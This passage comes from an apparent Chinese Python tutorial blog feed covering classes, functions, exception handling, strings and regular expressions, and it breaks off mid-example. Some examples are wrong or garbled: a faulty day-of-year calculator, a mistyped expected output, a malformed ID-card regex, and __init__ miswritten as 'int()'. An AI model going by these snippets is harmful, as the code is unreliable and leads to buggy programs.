    <content type="text"><![CDATA[1、面向对象概述1.1、对象（object）对象是一个抽象的概念，表示任意存在的事物 对象可以分为2部分，就是静态部分和动态部分。静态部分被称为“属性”，如人的性别；动态部分指的是对象的行为（对象执行的动作），如人可以走路 在python中，一切都是对象，即不仅把具体事物称为对象，字符串、函数等也是对象。（pyhton天生就是面向对象的） 1.2、类类是封装对象的属性和行为的载体，反过来说具有相同属性和行为的一类实体被称为类。如定义一个鸟类，在该类中可以定义每个对象共有的属性和方法。而每一只鸟就是一个对象。对象是类的实例 1.3、面向对象程序设计特点面向对象程序设计具有3大基本特征：封装，继承，多态。 1、封装 封装是面向对象编程的核心思想，将对象的属性和行为封装起来，载体是类。类通常会对客户隐藏其实现细节。如我们看一本书，只需要看书的内容就可以，而不需要知道书是这么制作的。 封装思想保证了类内部数据结构的完整性，提高了程序的可维护性。 2、继承矩形是四边形的一种，矩形拥有四边形的全部特点，反之不然。矩形类可以看为继承四边形类后产生的类，称为子类。而四边形类称为父类或者超类。在python中子类的实例都是父类的实例，但是不能说父类的实例都是子类的实例。继承是重复利用的重要手段，子类可以继承父类的属性的同时，又增加了子类特有的属性和行为。 3、多态将父类对象应用于子类的特征就是多态。就是子类继承父类特征的同时，也具备了自己的特征，并且能够实现不同的效果，这就是多态化结构。 2、类的定义和使用2.1、定义类使用class关键字来定义类语法格式 class ClassName: &apos;&apos;&apos;类的帮助信息&apos;&apos;&apos; # 类文档字符串 statement # 类体 ,如果没有想好类的功能，可以使用pass代替 2.2、创建类的实例对象创建类的实例的语法： ClassName(parameterlist) 注意在python中创建实例不使用new关键字，这是它与其他面向对象语言的区别。 2.3、创建 int ()方法 int ()方法是一个特殊的方法，每当创建一个类的新实例时，Python会自动执行它。 int ()方法必须包含一个self参数,且必须是第一个参数。self参数是一个指向实例本身的引用，用于访问类中的属性和方法。在方法调用时会自动传递实际参数self 如 class Apple: &quot;&quot;&quot;苹果类&quot;&quot;&quot; def __init__(self): print(&quot;这是苹果类&quot;) ​ wildApple = Apple() 可以看出，在创建苹果类的实例时，虽然没有为 int ()方法指定参数，但是该方法会自动执行 当然 int ()方法出了self参数外，还可以自定义一些参数。例子 class Apple: &quot;&quot;&quot;苹果类&quot;&quot;&quot; def __init__(self, size, color): # 构造方法 print(&quot;这是苹果&quot;) print(size) print(color) ​ size_1 = “个大” color_1 = “又红” wildApple = Apple(size_1, color_1) # 创建苹果类的实例 2.4、创建类的成员并访问类的成员主要由实例的方法和数据成员组成。创建了类的成员后，可以通过类的实例进行访问 1、创建实例方法并访问 实例方法其实就是在类中定义函数 与int()方法类似语法格式如下 def functionName(self,parameterlist): block 参数说明：functionName：用于指定方法名，一般小写字母开头 self : 必要参数，其名称要是self以外的单词，用self只是个习惯 parameterlist: 用于指定除self以外的参数 block: 方法体，实现具体功能 实例方法创建完成之后，可以通过类的实例名称名称和“.”来访问。语法格式 instanceName.functionName(parametervalue) 2、创建数据成员并访问数据成员是指类中定义的变量（属性），根据定义的位置可以分为类属性和实例属性。 类属性：定义在类中且在函数体外的属性。可以在使用实例化的对象中公用。 实例属性定义在类的方法（实例方法）中的属性，只作用于当前的实例。如 class Apple: &quot;&quot;&quot;苹果类&quot;&quot;&quot; size = &quot;个大&quot; # 定义类属性 color = &quot;又红&quot; # 定义类属性 def __init__(self): # 构造方法 self.weight = &quot;又重&quot; print(&quot;这是苹果&quot;) print(Apple.size) print(Apple.color) print(self.weight) # 定义实例属性 ​ apple = Apple() # 创建苹果类的实例 注意实例属性只能通过实例名访问。当然实例属性也可以通过实例名称修改，修改后不影响该类的其他的实例中相应的实例属性的值如 class Apple: &quot;&quot;&quot;苹果类&quot;&quot;&quot; def __init__(self): # 构造方法 self.weight = &quot;又重&quot; print(self.weight) # 定义实例属性 ​ apple1 = Apple() apple2 = Apple() apple1.weight = “太轻了” print(apple1.weight) print(apple2.weight) 2.5、访问限制访问限制有3种方式。可以在属性或者方法前加个单下划线，双下划线，或者首尾加双下划线 1、首尾加双下划线：表示定义的特殊方法，一般是系统定义的名字如int() 2、单下划线：表示保护（protected）类型的成员，只允许类本身或者子类访问，但不可以使用“from module import*”语句导入 如： class Apple: &quot;&quot;&quot;苹果类&quot;&quot;&quot; _weight_apple = &quot;又重&quot; # 定义保护属性 def __init__(self): # 实例方法 print(Apple._weight_apple) # 在实例方法中访问保护属性 ​ apple1 = Apple() print(apple1._weight_apple) 保护属性可以通过实例名进行访问 3、双下划线：表示私有（private）类型成员，只允许定义该方法的类的本身进行访问，而且不能通过类的实例进行访问。但是可以通过”类的实例名._类名__xxx”进行访问 如 class Apple: &quot;&quot;&quot;苹果类&quot;&quot;&quot; __weight_apple = &quot;又重&quot; # 定义私有属性 def __init__(self): # 实例方法 print(Apple.__weight_apple) # 在实例方法中访问私有属性 ​ apple1 = Apple() print(apple1._Apple__weight_apple) 3、属性（property）3.1、创建用于计算的属性可以通过@property(装饰器)把一个方法转化为属性，从而实现用于计算的属性。可以直接通过方法名来访问。语法格式 @property def methodname(self) block 如 class Rect: def __init__(self, width, height): self.width = width # 矩形的宽 self.height = height # 矩形的高 @property # 将方法转化为属性 def area(self): return self.width*self.height # 返回矩形的面积 ​ rect = Rect(5, 4) # 创建类的实例 print(rect.area) # 输出属性的值 3.2、为属性添加安全的保护机制如果想要创建一个可读不能修改的属性，那么可以使用@property(装饰器)实现该效果 例子： class Rect: def __init__(self, width): self.width = width # 矩形的宽 @property # 将方法转化为属性 def area(self): return self.width ​ rect = Rect(5) # 创建类的实例 print(rect.area) # 输出属性的值 rect.area = 6 # 修改属性值 print(rect.area) # 获取属性值，会抛出AttributeError 4、继承4.1、继承的基本语法：语法格式： class ClassName(baseclasslist): &quot;&quot;&quot;类的帮助信息&quot;&quot;&quot; # 类文档字符串 statement # 类体 部分参数说明：baseclasslist:用于指定要继承的基类（父类），可以多个。类名之间用逗号隔开。如果不指定，将使用所以python对象的根类object. 4.2、方法重写基类（父类）的成员都会被派生类（子类）继承，当基类中的某个方法不完全适用于派生类时，就需要在派生类中重写基类的这个方法。例子：重写基类中的harvest方法 class Fruit: def __init__(self, color = &quot;绿色&quot;): Fruit.color = color # 定义类的属性 def harvest(self): print(&quot;水果……&quot;) ​ class Orange(Fruit): color = “橙色” def __init__(self): print(&quot;\n我是橘子&quot;) super().__init__() # 调用基类的__init__()方法 def harvest(self, color): print(&quot;橘子是：&quot; + color + &quot;的&quot;) # 输出参数形式color print(&quot;橘子已经收获了&quot;) print(&quot;橘子原来是：&quot; + Fruit.color + &quot;的&quot;) #输出类属性color ​ orange = Orange() orange.harvest(“橙色”) 这边有一点要注意，在派生类中定义init()方法时，不会自动调用基类的init()方法。故需要对派生类的init()方法进行初始化，就是在派生类中只有super()函数进行调用基类的init()方法，如下代码 1super().__init__()]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python知识整合（函数）]]></title>
    <url>%2F2019%2F09%2F12%2Fpython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E5%87%BD%E6%95%B0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、函数的创建与调用函数出了python中的内置函数外，我们也也可以根据需求，自己创建函数创建函数语法格式 def functionname([parameterlist]) [&apos;&apos;&apos;comments&apos;&apos;&apos;] [functionbody] 调用函数语法格式 functionname([parameterlist]) 小技巧：在调用函数时，如果指定了“comment(注释)”参数，那么在调用函数时，输入函数名及其左侧小括号时，就会显示该函数的帮助信息（注释的内容） 例子： def filterchar(string): &apos;&apos;&apos; 功能：过滤危险字符，并将过滤后的结果输出 about:要过滤的字符串 没有返回值 &apos;&apos;&apos; import re pattern = r&apos;(黑客)|(抓包)|(监听)|(trojan)&apos; sub = re.sub(pattern, &quot;@_@&quot;, string) print(sub) filterchar(&quot;黑客&quot;) 2、参数传递2.1、形式参数与实际参数（形参与实参）形式参数（形参）：在定义函数时，函数名后括号内的参数为形参实际参数（实参）：在调用一个函数时，函数名后括号内的参数为实参，也就是调用函数时，我们给函数传入的参数。 根据实践参数类型的不同，可以分为值传递和应用传递。当实际参数为不可变对象时，就是值传递：当实际参数为可变对象时就是引用传递。 例子：定义函数def demo(obj): print(“元值：”, obj) obj += obj调用函数 print(&quot;========值传递========&quot;) mot = &quot;唯有在被追赶的时候，你才能真正的奔跑。&quot; print(&quot;函数调用前：&quot;, mot) demo(mot) # 采用不可变量字符串 print(&quot;函数调用后：&quot;, mot) print(&quot;========引用传递========&quot;) list1 = [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;] print(&quot;函数调用前：&quot;, list1) demo(list1) # 采用可对象列表 print(&quot;函数调用后：&quot;, list1) 输出 ========值传递======== 函数调用前： 唯有在被追赶的时候，你才能真正的奔跑。 元值： 唯有在被追赶的时候，你才能真正的奔跑。 函数调用后： 唯有在被追赶的时候，你才能真正的奔跑。 ========引用传递======== 函数调用前： [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;] 元值： [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;] 函数调用后： [&apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;, &apos;apple&apos;, &apos;banana&apos;, &apos;orange&apos;, &apos;pear&apos;] 可以看出，值传递改变形参的值，但是不改变实参的值。引用传递改变形参的值，同时也改变实参的值。 2.2、位置参数位置参数也称必备参数，必须按照正确的顺序传入函数中 1、数量必须与定义时的一样 在调用函数时，指定的实际参数的数量必须与形式参数一样一样，否则会抛出TypeError异常，提示缺少的位置参数 2、位置必须与定义时的一致 不一致会产生下面2种异常（1）、抛出TypeErro异常该种异常主要是实参与形参类型不一致，且在函数中，2种类型无法转换（2）、产生的结果与预期的不符就是位置错了，但是他们的类型一致，比如身高和体重的参数位置反了。这其实是一种bug 2.3、关键字参数关键字参数是指使用形参的名字来确定输入的参数值，使用该方法，实参的位置不需要一致。如调用fun_bmi(persion,height,weight)函数，可以通过关键字参数 fun_mbi(height = 1.58, persion = &apos;john&apos;, weight = &apos;50&apos;) 2.4、为参数设置默认值语法格式： def functionname(…，[parameter1 = defaultvaluel]): [functionbody] 查看函数的默认值参数的语法 函数名.__defaults__ 使用可以变量作为参数的默认值时，多次调用，可能会产生意料之外的结果。为了防止这种情况的产生，我们可以使用None作为可变对象的默认值，还要加上检验代码。 在定义函数时，为形式参数设置默认值时，默认参数必须指向不可变对象 2.5、可变参数可变参数也称不定长参数。即传入函数的参数可以是0个，1个，2个等等。主要有*parameter和**parameter 2种形式 1、*parameter这种形式表示接收任意多个实际参数并将其放入一个元组中。如 def printfruit(*fruitname): print(&apos;\n我喜欢的水果有：&apos;) for i in fruitname: print(i) # 输出水果名称 printfruit(&apos;apple&apos;) printfruit(&apos;apple&apos;, &apos;banana&apos;, &apos;pear&apos;) 输出 我喜欢的水果有： apple 我喜欢的水果有： apple banana pear 如果想要用一个已经存在的列表作为函数的可变参数，可以在列表名称前加个’*‘。如 a = [&apos;apple&apos;, &apos;banana&apos;, &apos;pear&apos;] printfruit(*a) 2、**parameter这种形式表示可以接收任意多个类似关键字一样的显示赋值的实际参数如 def printsign(**sign): print() for key, value in sign.items(): # 遍历字典 print(key + &quot;的星座是：&quot; + value) printsign(a=&apos;水瓶&apos;) printsign(a=&apos;水瓶&apos;, b=&apos;狮子&apos;) 输出 a的星座是：水瓶 a的星座是：水瓶 b的星座是：狮子 如果想要用一个已经存在的字典作为函数的可变参数，可以在字典名称前加个’**‘。 3、返回值在python中无论return语句在什么位置，只有得到执行，就会直接结束函数的执行语法格式： result =return [value] 说明value为一个可选参数，用于指定要返回的值（可以是一个值，也可以是多个值，值可以是任意类型） 当函数中没有return语句，，或者省略return语句的参数时，将返回None(空值) 4、变量的作用域4.1、局部变量局部变量就是在函数内部定义并使用的变量。（在函数外部使用会抛出NameError异常） 4.2、全部变量1、在函数外部定义值得注意的事，当全局变量与局部变量重名时，对函数体内的变量进行赋值后，不影响函数体外的变量。 2、在函数内定义在函数体内定义全局变量，需要使用global关键字语法格式 global 变量 5、匿名函数匿名函数就是没有名字的函数，一般只使用一次。使用lambda关键字语法格式 result = lambda [arg1 [,arg2,...,argn]]：expression 参数说明：result：用于调用lambda表达式[arg1 [,arg2,…,argn]]：可选参数，用于指定的要传递的参数列表expression: 必选参数，用于指定一个实现具体功能的表达式。 注意：使用lambda关键字只能有一个返回值和出现其他非表达式语句（如for或while）如： import math r = 10 result = lambda r: math.pi*r*r print(&quot;半径为&quot;, r, &quot;的圆的面积为&quot;, result(r)) lambda的首页用途是指定短小的回调函数。 6、牛刀小试6.1、输出第几天请编写一个程序，实现输入任意的年月日就可以计算出是这一年的第几天，如输入20190203，就可以输出这是2019年的第34天。 def data(y, m, d): if m &lt;= 2: return &quot;这是&quot;+str(y)+&quot;年的第&quot;+str((m-1)*31+d)+&quot;天&quot; elif m in (3, 5, 7, 9, 10, 11, 12): return &quot;这是&quot; + str(y) + &quot;年的第&quot; + str((m - 1) * 31 + d - m//2 - 1 + y % 4 - 1) + &quot;天&quot; elif m in (4, 6, 8): return &quot;这是&quot; + str(y) + &quot;年的第&quot; + str((m - 1) * 31 + d - m//2 - 1 + y % 4) + &quot;天&quot; ​ if name == ‘main‘: a = data(2017, 1, 1) print(a) 6.2、找出重复IP下面list 中提供了几组IP地址，编写一个函数，将list中重复出现的IP地址找出来。list=[‘192.168.1.1’,’10.192.66.72’,’10.199.88.132’, ‘192.168.1.1’,’1.192.168.163’] def main(): a=[&apos;192.168.1.1&apos;,&apos;10.192.66.72&apos;,&apos;10.199.88.132&apos;, &apos;192.168.1.1&apos;,&apos;192.168.163&apos;] b=[] c=[] for i in range (0,len(a)): if a[i] not in b: b.append(a[i]) else: c.append(a[i]) print (c) if __name__ == &apos;__main__&apos;: main() 6.3、大写模式编写-一个函数，把输入的字母统一成大写模式， 如输入“go big or go home”,输出为“60BIG OR G0 HOME”。 123456def demo(a): a = a.upper() return aif __name__ == '__main__': b = demo('go big or go home') print(b)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python知识集合（异常处理和程序调试）]]></title>
    <url>%2F2019%2F09%2F12%2FPython%E7%9F%A5%E8%AF%86%E9%9B%86%E5%90%88%EF%BC%88%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、异常处理语句1.1、try…except语句语法格式： try: block1 except [ExceptionName [as alias]]: block2 参数说明： block1：表示可能出错的代码块 ExceptionName [as alias]:可选参数，用于指定要捕获的异常，其中 ExceptionName表示要捕获的异常名称，如果在其右侧加上 as alias 表示当前的异常指定一个别名。 block2：表示进行异常处理的代码块，在这里可以输出固定的提示信息，也可以通过别名输出异常的具体内容 注意：如果except后面不知道异常名称，则表示捕获全部异常。使用try…except语句捕获异常后，程序会继续执行。 1.2、try …except…else语句try …except…else语句与try …except语句的不同在于当没有异常时，使用else子语句。 例子 def division(): &apos;&apos;&apos; 实现功能：分苹果 &apos;&apos;&apos; print(&quot;\n-----------------分苹果了-----------------\n&quot;) apple = int(input(&quot;请输入苹果个数：&quot;)) children = int(input(&quot;请输出一共有几个小朋友：&quot;)) result = apple // children # 计算每个小朋友分几个苹果，输出整数 remain = apple - result * children # 计算剩下的苹果 if remain &gt; 0: print(apple, &quot;个苹果，平均分给&quot;, children, &quot;个小朋友，每人分&quot;, result,&quot;个，剩下&quot;, remain, &quot;个。&quot;) else: print(apple, &quot;个苹果，平均分给&quot;, children, &quot;个小朋友，每人分&quot;, result, &quot;个。&quot;) if __name__ == &apos;__main__&apos;: try: # 捕获异常 division() except ZeroDivisionError: # 处理zero异常 print(&quot;\n出错了，不能把苹果分给0个小朋友。&quot;) except ValueError as e: # 处理value异常 print(&quot;输入错误：&quot;, e) else: # 没有抛出异常时执行 print(&quot;苹果成功分给小朋友。&quot;) 1.3、try …except …finally语句不管是否有异常产生，都会执行finally里的语句语法格式： try: block1 except [ExceptionName [as alias]]: block2 finally: block3 例子 def division(): &apos;&apos;&apos; 实现功能：分苹果 &apos;&apos;&apos; print(&quot;\n-----------------分苹果了-----------------\n&quot;) apple = int(input(&quot;请输入苹果个数：&quot;)) children = int(input(&quot;请输出一共有几个小朋友：&quot;)) result = apple // children # 计算每个小朋友分几个苹果，输出整数 remain = apple - result * children # 计算剩下的苹果 if remain &gt; 0: print(apple, &quot;个苹果，平均分给&quot;, children, &quot;个小朋友，每人分&quot;, result,&quot;个，剩下&quot;, remain, &quot;个。&quot;) else: print(apple, &quot;个苹果，平均分给&quot;, children, &quot;个小朋友，每人分&quot;, result, &quot;个。&quot;) if __name__ == &apos;__main__&apos;: try: # 捕获异常 division() except ZeroDivisionError: # 处理zero异常 print(&quot;\n出错了，不能把苹果分给0个小朋友。&quot;) except ValueError as e: # 处理value异常 print(&quot;输入错误：&quot;, e) else: # 没有抛出异常时执行 print(&quot;苹果成功分给小朋友。&quot;) finally: print(&quot;进行了一次分苹果操作&quot;) 输出： -----------------分苹果了----------------- 请输入苹果个数：8 请输出一共有几个小朋友：0 出错了，不能把苹果分给0个小朋友。 进行了一次分苹果操作 1.4、使用raise语句抛出异常如果函数或方法中有异常，却不想在当前函数或方法中处理异常，可以使用raise处理异常。语法格式： raise [ExceptionName [(raise)]] 2、使用assert语句调试程序语法格式： assert expression [,reason] 说明：expression: 条件表达式，如果该表达式为真什么，都不用做，如果为假抛出AssertionError异常。reason：可选参数，用于对判断条件进行描述，为了以后更好的知道哪里出了问题例子 def division(): &apos;&apos;&apos; 实现功能：分苹果 &apos;&apos;&apos; print(&quot;\n-----------------分苹果了-----------------\n&quot;) apple = int(input(&quot;请输入苹果个数：&quot;)) children = int(input(&quot;请输出一共有几个小朋友：&quot;)) assert apple &gt; children, &quot;苹果不够分&quot; result = apple // children # 计算每个小朋友分几个苹果，输出整数 remain = apple - result * children # 计算剩下的苹果 if remain &gt; 0: print(apple, &quot;个苹果，平均分给&quot;, children, &quot;个小朋友，每人分&quot;, result,&quot;个，剩下&quot;, remain, &quot;个。&quot;) else: print(apple, &quot;个苹果，平均分给&quot;, children, &quot;个小朋友，每人分&quot;, result, &quot;个。&quot;) if __name__ == &apos;__main__&apos;: division() 输出： 请输入苹果个数：5 请输出一共有几个小朋友：8 Traceback (most recent call last): File &quot;D:/Python/web/test.py&quot;, line 14, in &lt;module&gt; division() File &quot;D:/Python/web/test.py&quot;, line 6, in division assert apple &gt; children, &quot;苹果不够分&quot; AssertionError: 苹果不够分 通常情况下，assert语句可以和异常处理语句结合使用，把上面的代码的最后一行语句改为 try: division() except AssertionError as e: print(&quot;\n输出有误：&quot;, e) 输出 -----------------分苹果了----------------- 请输入苹果个数：5 请输出一共有几个小朋友：8 输出有误： 苹果不够分 注意：assert语句只在调试阶段有效。我们可以通过在执行python命令时加入-O(大写)参数来关闭asset语句。如在命令行窗口下可以使用以下命令 1python -O 调试文件.py]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python知识整合（字符串及正则表达式）]]></title>
    <url>%2F2019%2F09%2F12%2FPython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8A%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、字符串常规操作1.1、拼接字符串使用“+”号可以实现多个字符串的拼接，并产生一个字符串对象。如 a = &quot;123&quot; print(a+&quot;1234&quot;) 1.2计算字符串长度使用len（）函数如 str =&quot;123a,时候&quot; print(len(str)) 输出 7 可以看出在len函数计算字符串的长度时，不区分数字，英文，汉字，所有字符都认为是一个字节但是，如果采用UTF-8编码，汉字占3个字节，采用GBK或者GB2312编码时，汉字占2个字节如 str =&quot;123a,时候&quot; print(len(str.encode())) #utf-8编码 print(len(str.encode(gbk))) #gbk编码 输出 15 12 1.3、截取字符串通过切片方法实现语法格式如下 string(start : end : step) 如 str = &quot;你就是个啊哈&quot; str1 = str[1] #截取第二个字符 str1 = str[2:] #从第3个字符开始截取 str2 = str[:2] #从左边开始截取2个字符 str3 = str[2:4] #截取第3个到第4个字符 1.4、分隔字符串使用split函数分隔语法格式 str.split(sep,maxsplit) 说明1、str:表示进行分隔的字符串2、sep表示指定的分隔符，可以包含多个指定字符，如果不指定，那么默认为None，即所有的空字符（包括空格，\n等等）3、maxsplit:可选参数，用于指定分隔的次数，如果不指定或者为-1，分隔次数没有限制，否则返回的元素最多为maxsplit+1。4、如果不指定sep,也不能指定maxsplit5、返回值为字符串列表 1.5、检索字符串1、count方法count（）方法检索字符串在另一个字符串中出现的次数。如果字符串不存在返回0，否则返回次数，其语法格式如下。 str.count(sub[,start[,end]]) 说明：str表示原字符串sub表示要检索的字符串start表示可选参数，检索的起始位置，若不指定，从头检索end，与start相似。 2、find方法检索是否包含指定的字符串，如果检索的字符串不存在则，返回-1，否则返回该字符串首次出现的索引语法格式 str.find(sub[,start[,end]]) 3、index（）方法与find（）方法类似，不过使用index()方法，当指定的字符串不存在时抛出异常语法格式 str.index(sub[,start[,end]]) 4、startwith()方法检测是否以指定字符串开头，是返回True,不是返回False语法格式： str.startswith(prefix[,start[,end]]) 参数说明，str表示原字符串，prefix表示要检索的字符串其他参数说明与find()方法类似 5、endwith()方法检测是否以指定字符串结尾，是返回True,不是返回False语法格式 str.endswith(suffix[,start[,end]]) 1.6、字母的大小写转换1、lower（）方法将字符串中的全部的大写字母转化为小写字母。语法格式： str.lower() 2、upper()方法将字符串中的全部的小写字母转化为大写字母。语法格式： str.upper() 3、swapcase()方法同时将字符串中的全部的小写字母转化为大写字母，全部的大写字母转化为小写字母。 str.swapcase() 1.7、去除字符串中的空格和特殊字符特殊字符在这里指的是：\t \r \n(制表、回车、换行)1、strip（）方法去除字符串的左右两侧的空格和特殊字符语法格式 str.strip([chars]) 如 str1 = &quot; 12323 \n&quot; print(&quot;原字符串str1：&quot; + str1) print(&quot;字符串：&quot; + str1.strip() + &quot;.&quot;) # 去除首尾的空格和特殊字符 str2 = &quot;#133#.&quot; print(&quot;原字符串str2：&quot; + str2) print(&quot;字符串：&quot; + str2.strip(&apos;#.&apos;)) #去除首位的#或者. 输出 原字符串str1： 12323 字符串：12323. 原字符串str2：#133#. 字符串：133 2、lstrip()方法lstrip（）方法可以去除字符串左侧的空格和特殊字符，语法格式 str.lstrip([chars]) 3、rstrip()方法rstrip（）方法可以去除字符串由右侧的空格和特殊字符，语法格式 str.rstrip([chars]) 1.8、格式化字符串格式化字符串就是先定义一个模板，然后在模板中留几个空位，空位用占位符来标记 1、使用%号操作符（逐渐没落） 常用的格式化字符| 格式化字符 | 说明 | 格式化字符 | 说明 || ———- | ——————— | ———- | ———————- || %s | 字符串（采用str显示） | %r | 字符串（采用repr显示） || %c | 单个字符 | %o | 八进制整数 || %d或者%i | 十进制整数 | %e | 指数（基地写为e） || %x | 16进制整数 | %E | 指数（基地写为E） || %f或者%F | 浮点数 | %% | 字符% | 如 a = &quot;小明为莆田%d中学生，学号为%d,同学都叫他%s&quot; # 定义模板 b1 = (6, 31111111, &apos;小明&apos;) # 定义与转化的内容 print(a % b1) # 格式化输出 输出 小明为莆田6中学生，学号为31111111,同学都叫他小明 2、使用字符串对象的format()方法（推荐使用）语法格式 str.format(args) args用于指定与转化的项 format()方法中常用的格式化字符| s | 对字符串类型进行格式化 || ——– | ——————————————- || b | 将十进制数自动转换成二进制数表示再格式化 || d | 十进制整数 || o | 将十进制数自动转换成八进制数表示再格式化 || c | 将十进制数自动转换成对应的unicode字符 || x 或者 X | 将十进制数自动转换成十六进制数表示再格式化 || e或者E | 转化为科学计数法表示再格式化 || f或者F | 转化为浮点数（默认小数点后保留6位）再格式化 || g或者G | 自动在e和f或者E和F中切换 || % | 显示百分比（默认小数点后保留6位） | 如 a = &quot;小明为莆田{:d}中学生，学号为{:0&gt;7d},同学都叫他{:s}&quot; # 定义模板 b1 = a.format(6, 31111111, &apos;小明&apos;) # 定义与转化的内容 print(b1) # 格式化输出 输出 小明为莆田6中学生，学号为31111111,同学都叫他小明 2、正则表达式基础2.1、行定位符行定位符就是用来描述字符串的边界。“^”表示行的开始，“$”表示行的结尾如 ^tm$ 2.2、常用的元字符 代码 说明 . 匹配除换行符以外的任意字符 \w 匹配字母数字、下划线或者汉字 \s 匹配任意的空格符 \d 匹配数字 \b 匹配单词的开始或者结束 ^ 匹配字符串的开始 $ 匹配字符串的结尾 2.3、限定符如匹配8位QQ号码可以使用下面的方式表示 ^\d{8}$ 常用的限定符| 限定符 | 说明 | 举例 || —— | ——————————- | ——————————————— || ？ | 匹配前面的字符零次或者一次 | app?le，该表达式可以匹配apple或者aple || + | 匹配前面的字符者一次或多次 | app+le，该表达式可以匹配apple到app….le || | 匹配前面的字符者零次或多次 | apple，该表达式可以匹配aple到app….le || {n} | 匹配前面的字符者n次 | app{2}le，该表达式可以匹配appple || {n,} | 匹配前面的字符者最少n次 | app{2,}le，该表达式可以匹配appple到appp…le || {n,m} | 匹配前面的字符者最少n次,最多m次 | app{2,3}le，该表达式可以匹配appple或者apppple | 2.4、字符类如果匹配没有预定义的元字符的字符集合（比如元音字母a,e,i,o,u）我们可以使用方括号，然后把要匹配的内容写在方括号里，如[aeiou]匹配任何一个元音字母。[0-9]与\d的效果一样[a-z0-9A-Z]与\w的效果一样(只考虑英文)[\u4e00-\u9fa5]匹配给定字符串的任意一个汉字，匹配连续多个汉字[\u4e00-\u9fa5]+ 2.5、排除字符把^放在方括号里就是排除的意思如 [^a-zA-Z] 该表达式用于匹配一个不是字母的字符串 2.6、选择字符例子，匹配身份证号码身份证号码为15位或者18位，如果是15位的全为数字，如果是17位，则最后一位是效验位，为数字或者X(x)可以使用下面表达式匹配 ^\d{15})|(^\d{18}) |(^\d{17} (\d|X|x)$ 意思是匹配15位或者18位数字或者17位数字和最后一位是数字或者X或者x 2.7、转义字符正则表达式中的转义字符也是将特殊字符（“.”、“？”，“\”）变为普通的字符。如用正则表达式表示127.0.0.1这样格式的IP地址 [1-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3} 注意括号在正则表达式也算一个字符 2.8、分组例子 （thir|four）th 意思是匹配单词thirth或者fourth，如果不使用小括号，就变成了匹配单词thir和fourth 小括号的第二个作用就是分组。如 （\.[1-9]{1,3}){2},就是对（\.[1-9]{1,3})进行操作 2.9、在python中使用正则表达式语法在Python中使用正则表达式就是将其作为模式字符串使用的。将匹配以m开头的正则表达式转化为模式字符串 &apos;\\bm\\w*\\b&apos; 因为模式字符串可能包含大量的特殊字符和斜杠，所以需要使用原生字符串就是在模式字符串前加上r或者R.如 r ‘\bm\w*\b’ 3、使用re模块实现正则表达式操作3.1、匹配字符串1.使用match（）方法进行匹配如果在其实位置匹配成功，则返回Match对象，否则返回None,其语法格式如下： re.match(pattern,string,[flags]) 说明pattern:表示模式字符串，由要匹配的正则表达式转换而来string:表示要匹配的字符串flags：可选参数，表示标识位，用于控制匹配方式，如是否区分字母大小写。常用的标志如下表所示| 标志 | 说明 || ————- | ———————————————————— || A或ASCII | 对\w、\W、\b、\B、\d、\D、\s、\S只进行ASCII匹配（只适用Python3.x） || I或ICNORECASE | 执行不按字母大小写匹配 || M或MULTLINE | 将^和$用于包括整个字符串的开始和结尾的每一行 || S或DOTALL | 使用“.”字符匹配所有字符，包括换行符 || X或VERBOSE | 忽略模式字符串中为转义的空格和注释 | 如 import re pattern = r&apos;mr_\w+&apos; # 模式字符串 string = &apos;MR_SHOP mr_shop&apos; # 要匹配的字符串 match = re.match(pattern, string,re.I) # 匹配字符串不区分大小写 print(&quot;匹配值的起始位置：&quot;, match.start()) print(&quot;匹配值的结束位置：&quot;, match.end()) print(&quot;匹配位置的元组：&quot;, match.span()) print(&quot;要匹配的字符串：&quot;, match.string) print(&quot;匹配数据&quot;, match.group()) 输出 匹配值的起始位置： 0 匹配值的结束位置： 7 匹配位置的元组： (0, 7) 要匹配的字符串： MR_SHOP mr_shop 匹配数据 MR_SHOP 2、使用search()方法进行匹配search()方法用于在整个字符串的搜索第一个匹配的值，如果在匹配成功返回match对象，否则返回None语法格式 re.search(pattern,string,[flags]) 参数说明参考match方法 3、使用findall()方法进行匹配findall方法主要用于整个字符串中搜索所有符合正则表达式的字符串，并以列表的形式返回。如果匹配成功返回包含匹配结构的列表，否则返回空列表。语法格式 re.findall(pattern,string,[flags]) 参数说明参考match方法如 import re pattern = r&apos;([1-9]{1,3}(\.[0-9]{1,3}){3})&apos; str1 = &apos;127.0.0.1 192.168.122.2&apos; match = re.findall(pattern, str1) for i in match: print(i[0]) 输出 127.0.0.1 192.168.122.2 3.2、替换字符使用sub()方法进行字符串替换语法格式 re.sub(pattern, repl, string, count, flags) 说明pattern:表示模式字符串repl:表示替换的字符串string：表示要被查找替换的原始字符串count: 可选参数表示模式匹配后替换的最大次数，默认为0表示替换所有的匹配flags: 可选参数，表示标志位，用于控制匹配方式，如区分大小写等，参考match()方法 例子 import re pattern = r&apos;1[34578]\d{9}&apos; string = &apos;中奖号码为：84795643 联系电话为：13611111111&apos; result = re.sub(pattern, &apos;1xxxxxxxxxx&apos;, string) print(result) 输出 中奖号码为：84795643 联系电话为：1xxxxxxxxxx 3.3、使用正则表达式分隔字符串split()方法进行分隔字符串，并以列表形式返回语法格式 re.split(pattern, string, [maxsplit], [flags]) 说明pattern:表示模式字符串string：表示要匹配的字符串maxsplit: 可选参数，表示最大的拆分次数flags: 可选参数，表示标志位，用于控制匹配方式，如区分大小写等，参考match()方法例子 import re pattern = 